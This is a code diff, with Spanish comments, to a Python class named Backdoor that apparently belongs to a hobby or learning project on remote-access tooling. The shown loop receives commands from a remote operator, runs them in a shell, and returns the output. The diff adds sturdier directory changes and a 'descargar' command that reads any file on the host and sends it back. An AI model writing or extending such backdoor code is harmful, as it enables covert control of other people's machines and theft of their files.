@@ -36,24 +36,37 @@ class Backdoor:
         try:
             return subprocess.check_output(command, shell=True)
         except subprocess.CalledProcessError:
-            return 'Comado no reconocido o error en el valor de salida'
+            return '[-] Comado no reconocido o error en el valor de salida'
 
     def changeDirectory(self, path):
-        os.chdir(path)
-        return f'[+] Cambiando a {path}'
+        try:
+            os.chdir(path)
+            return f'[+] Cambiando a {path}'
+
+        except (FileNotFoundError, OSError): 
+            return '[-] El sistema no puede encontrar la ruta especificada'
+    
+    def readFile(self, path):
+        with open(path, 'rb') as file:
+            return file.read()
     
     def run(self):
         try:
             while True: #Permite al programa ejecutarse indefinidamente
                 command = self.reliableRecieve() #Recibe toda la información que le enviemos(En este caso, comandos de consola)
-                if command[0] == 'salir' or command[0] == 'Salir':
+                if command[0] == 'salir':
                     self.connection.close()
                     exit()
 
                 elif command[0] == 'cd' and len(command) > 1:
-                    commandResults = self.changeDirectory(command[1])
+                    commandResults = self.changeDirectory(' '.join(command[1:]))
 
-                else: commandResults = self.runCommand(command)
+                elif command[0] == 'descargar':
+                    commandResults = self.readFile(' '.join(command[1:]))
+
+                else: 
+                    commandResults = self.runCommand(command)
+                    
                 self.reliableSend(commandResults)
 
         except KeyboardInterrupt:
